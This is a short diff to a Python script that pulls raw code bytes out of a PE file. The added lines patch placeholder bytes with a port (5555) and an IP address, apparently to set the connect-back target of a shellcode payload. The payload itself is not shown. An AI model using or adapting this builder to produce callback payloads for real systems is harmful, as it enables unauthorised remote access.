@@ -2,6 +2,7 @@
 # -*- coding:utf-8 -*-
 import pefile
 import struct
+import socket
 import sys
 
 def EntryPoint(argv):
@@ -21,7 +22,10 @@ def EntryPoint(argv):
             ofs = raw.index(b'\xcc\xcc\xcc\xcc');
             raw = raw[:ofs];
             siz = struct.pack('<I', len(raw));
+
             raw = raw.replace(b'\x41\x41\x41\x41', siz);
+            raw = raw.replace(b'\x42\x42', struct.pack('<H', socket.htons(5555)));
+            raw = raw.replace(b'\x43\x43\x43\x43', socket.inet_aton("192.168.213.159"));
             
             bin = open(argv[2], 'wb+');
             bin.write(raw);
